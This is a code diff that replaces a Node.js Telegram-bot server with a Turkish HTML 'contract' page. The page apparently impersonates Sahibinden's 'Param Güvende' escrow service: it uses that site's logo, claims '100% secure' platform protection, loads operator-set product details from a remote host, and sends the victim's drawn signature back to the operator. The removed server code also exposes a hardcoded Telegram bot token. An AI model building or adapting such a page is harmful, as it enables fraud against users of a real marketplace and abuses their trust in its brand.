@@ -1,139 +1,310 @@
-const express = require("express");
-const fs = require("fs");
-const TelegramBot = require("node-telegram-bot-api");
-const cors = require("cors");
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Param Güvende Sözleşme</title>
 
-const app = express();
-
-const ALLOWED_ORIGIN = "https://telegramtestinbots1.github.io";
-const token = "8741427596:AAGokUoGuYMbFW-6IVFvQYWx7I8ktdWu8xw";
-
-const ALLOWED_USERS = [
-  6048463375,   // sen
-  0,            // 2. kullanıcı
-  0,            // 3. kullanıcı
-  0             // 4. kullanıcı
-];
-
-const MAIN_ADMIN_ID = 6048463375;
-
-app.use(cors({
-  origin: ALLOWED_ORIGIN,
-  methods: ["GET", "POST", "OPTIONS"],
-  allowedHeaders: ["Content-Type"]
-}));
-
-app.use(express.json());
-
-function isAllowedUser(msg) {
-  return ALLOWED_USERS.includes(Number(msg.from.id));
+<style>
+body {
+    margin:0;
+    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
+    background:#f4f6f8;
 }
 
-function readProduct() {
-  const data = fs.readFileSync("product.json", "utf8");
-  return JSON.parse(data);
+/* HEADER */
+.header {
+    background:#0f172a;
+    padding:18px 12px;
 }
 
-function writeProduct(product) {
-  fs.writeFileSync("product.json", JSON.stringify(product, null, 2));
+.header-center {
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    text-align:center;
+    gap:6px;
 }
 
-app.get("/product", (req, res) => {
-  try {
-    res.json(readProduct());
-  } catch (err) {
-    console.error("Ürün okuma hatası:", err);
-    res.status(500).json({ error: "Ürün okunamadı" });
-  }
-});
+.logo { height:28px; }
 
-app.post("/update-product", (req, res) => {
-  try {
-    writeProduct(req.body);
-    res.send("Ürün güncellendi");
-  } catch (err) {
-    console.error("Ürün güncelleme hatası:", err);
-    res.status(500).send("Hata oluştu");
-  }
-});
+.sub {
+    color:#cbd5e1;
+    font-size:12px;
+}
 
-app.post("/submit", async (req, res) => {
-  try {
-    const { signature, product } = req.body;
+.secure-badge {
+    margin-top:6px;
+    background:linear-gradient(135deg, #16a34a, #22c55e);
+    color:white;
+    font-size:11px;
+    padding:4px 10px;
+    border-radius:999px;
+    font-weight:600;
+}
 
-    await bot.sendPhoto(MAIN_ADMIN_ID, signature, {
-      caption:
-        "Yeni sözleşme\n" +
-        (product?.name || "") + "\n" +
-        (product?.price || "") + "\n" +
-        (product?.seller || "") + "\n" +
-        (product?.phone || "")
-    });
+/* CONTAINER */
+.container {
+    padding:16px;
+    max-width:720px;
+    margin:auto;
+}
 
-    res.send("ok");
-  } catch (err) {
-    console.error("Submit hatası:", err);
-    res.status(500).send("Gönderim hatası");
-  }
-});
+/* TRUST BOX */
+.trust-box {
+    background:#ecfeff;
+    border:1px solid #67e8f9;
+    padding:12px;
+    border-radius:10px;
+    font-size:13px;
+    margin-bottom:12px;
+}
 
-app.get("/ping", (req, res) => {
-  res.send("ok");
-});
+/* CARD */
+.card {
+    background:white;
+    border-radius:12px;
+    padding:14px;
+    margin-bottom:10px;
+    box-shadow:0 2px 8px rgba(0,0,0,0.05);
+}
 
-app.listen(process.env.PORT || 3000, () => {
-  console.log("Server çalışıyor");
-});
+.title {
+    font-weight:700;
+    margin-bottom:10px;
+}
 
-const bot = new TelegramBot(token, { polling: true });
+/* ÜRÜN BOX */
+.product-box {
+    background: linear-gradient(135deg, #ffffff, #f1f5f9);
+    border: 1px solid #e2e8f0;
+    border-left: 5px solid #16a34a;
+    padding: 14px;
+    border-radius: 12px;
+    font-size: 14px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+}
 
-console.log("Bot çalışıyor...");
+.product-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-bottom: 6px;
+}
 
-bot.onText(/\/id/, (msg) => {
-  bot.sendMessage(
-    msg.chat.id,
-    `userId: ${Number(msg.from.id)}\nchatId: ${Number(msg.chat.id)}`
-  );
-});
+.product-item {
+    background: #ffffff;
+    border: 1px solid #e5e7eb;
+    padding: 8px 10px;
+    border-radius: 8px;
+}
 
-bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(
-    msg.chat.id,
-    `Merhaba\nuserId: ${Number(msg.from.id)}\nYetkili: ${isAllowedUser(msg) ? "evet" : "hayır"}`
-  );
-});
+.product-label {
+    font-weight: 700;
+    color: #0f172a;
+}
 
-bot.onText(/\/urun (.+)/, (msg, match) => {
-  const chatId = msg.chat.id;
+.product-value {
+    color: #1e293b;
+    font-weight: 500;
+}
 
-  try {
-    if (!isAllowedUser(msg)) {
-      bot.sendMessage(chatId, `⛔️ Yetkisiz kullanım\nuserId: ${Number(msg.from.id)}`);
-      return;
+/* MOBİL */
+@media (max-width: 500px) {
+    .product-row {
+        grid-template-columns: 1fr;
     }
+}
 
-    const data = match[1].split("|");
+/* IMAGE */
+.product-img {
+    width:100%;
+    border-radius:10px;
+    margin-bottom:10px;
+    display:none;
+}
 
-    if (data.length < 5) {
-      bot.sendMessage(
-        chatId,
-        "❌ Kullanım:\n/urun ÜrünAdı|Fiyat|ResimURL|SatıcıAdı|Telefon"
-      );
-      return;
-    }
+/* SIGNATURE */
+canvas {
+    width:100%;
+    height:180px;
+    border:2px dashed #cbd5e1;
+    border-radius:10px;
+    background:#fff;
+}
 
-    const product = {
-      name: data[0].trim(),
-      price: data[1].trim(),
-      image: data[2].trim(),
-      seller: data[3].trim(),
-      phone: data[4].trim()
-    };
+/* ACTIONS */
+.actions {
+    position:sticky;
+    bottom:0;
+    background:white;
+    padding:12px;
+    box-shadow:0 -3px 10px rgba(0,0,0,0.1);
+}
 
-    writeProduct(product);
-    bot.sendMessage(chatId, "✅ Ürün güncellendi!");
-  } catch (err) {
-    console.error(err);
-    bot.sendMessage(chatId, "❌ Hata oluştu");
-  }
+button {
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:10px;
+    font-weight:700;
+    font-size:14px;
+}
+
+.primary {
+    background:#16a34a;
+    color:white;
+}
+
+.secondary {
+    margin-top:8px;
+    background:#e5e7eb;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+    <div class="header-center">
+        <img src="https://upload.wikimedia.org/wikipedia/tr/archive/5/51/20121213095814%21Sahibinden-2010-200px.jpg" class="logo">
+        <div class="sub">Param Güvende Hizmet Sözleşmesi</div>
+        <div class="secure-badge">🔒 %100 Güvenli İşlem</div>
+    </div>
+</div>
+
+<div class="container">
+
+<div class="trust-box">
+🛡️ Bu işlem, ödeme güvenliği sağlamak amacıyla platform güvencesi altında yürütülmektedir.
+</div>
+
+<!-- ÜRÜN -->
+<div class="card">
+<div class="title">Ürün Bilgisi</div>
+
+<img id="pimg" class="product-img">
+
+<div class="product-box">
+
+    <div class="product-row">
+
+        <div class="product-item">
+            <span class="product-label">Ürün Adı:</span>
+            <span class="product-value" id="pname"></span>
+        </div>
+
+        <div class="product-item">
+            <span class="product-label">Ürün Fiyatı:</span>
+            <span class="product-value" id="pprice"></span>
+        </div>
+
+    </div>
+
+    <div class="product-row">
+
+        <div class="product-item">
+            <span class="product-label">Satıcı:</span>
+            <span class="product-value" id="pseller"></span>
+        </div>
+
+        <div class="product-item">
+            <span class="product-label">İletişim:</span>
+            <span class="product-value" id="pphone"></span>
+        </div>
+
+    </div>
+
+</div>
+
+</div>
+
+<!-- SIGN -->
+<div class="card">
+<div class="title">İmzanız</div>
+<canvas id="pad"></canvas>
+<button class="secondary" onclick="clearPad()">Temizle</button>
+</div>
+
+<div class="card">
+<label>
+<input type="checkbox" id="check">
+ Sözleşmeyi okudum ve kabul ediyorum
+</label>
+</div>
+
+</div>
+
+<div class="actions">
+<button class="primary" onclick="send()">Sözleşmeyi Onayla ve İmzala</button>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/signature_pad@4.0.0/dist/signature_pad.umd.min.js"></script>
+
+<script>
+const canvas = document.getElementById("pad");
+const pad = new SignaturePad(canvas);
+
+function resize(){
+ let ratio = Math.max(window.devicePixelRatio,1);
+ canvas.width = canvas.offsetWidth * ratio;
+ canvas.height = canvas.offsetHeight * ratio;
+ canvas.getContext("2d").scale(ratio,ratio);
+}
+resize();
+
+function clearPad(){
+ pad.clear();
+}
+
+// ÜRÜN ÇEK
+fetch("https://telegram-product-system.onrender.com/product")
+.then(r=>r.json())
+.then(d=>{
+ document.getElementById("pname").innerText = d.name || "-";
+ document.getElementById("pprice").innerText = d.price || "-";
+ document.getElementById("pseller").innerText = d.seller || "-";
+ document.getElementById("pphone").innerText = d.phone || "-";
+
+ if(d.image){
+   const img = document.getElementById("pimg");
+   img.src = d.image;
+   img.style.display = "block";
+ }
 });
+
+// GÖNDER
+function send(){
+
+ if(!document.getElementById("check").checked){
+   alert("Sözleşmeyi kabul etmelisiniz");
+   return;
+ }
+
+ if(pad.isEmpty()){
+   alert("İmza gereklidir");
+   return;
+ }
+
+ const data = pad.toDataURL();
+
+ fetch("https://telegram-product-system.onrender.com/submit", {
+   method:"POST",
+   headers:{"Content-Type":"application/json"},
+   body: JSON.stringify({
+     signature: data,
+     product:{
+       name: document.getElementById("pname").innerText,
+       price: document.getElementById("pprice").innerText,
+       seller: document.getElementById("pseller").innerText,
+       phone: document.getElementById("pphone").innerText
+     }
+   })
+ });
+
+ alert("Sözleşmeniz başarıyla kayıt altına alınmıştır. Yetkili temsilcinizi bilgilendirmenizi rica ederiz.");
+}
+</script>
+
+</body>
+</html>
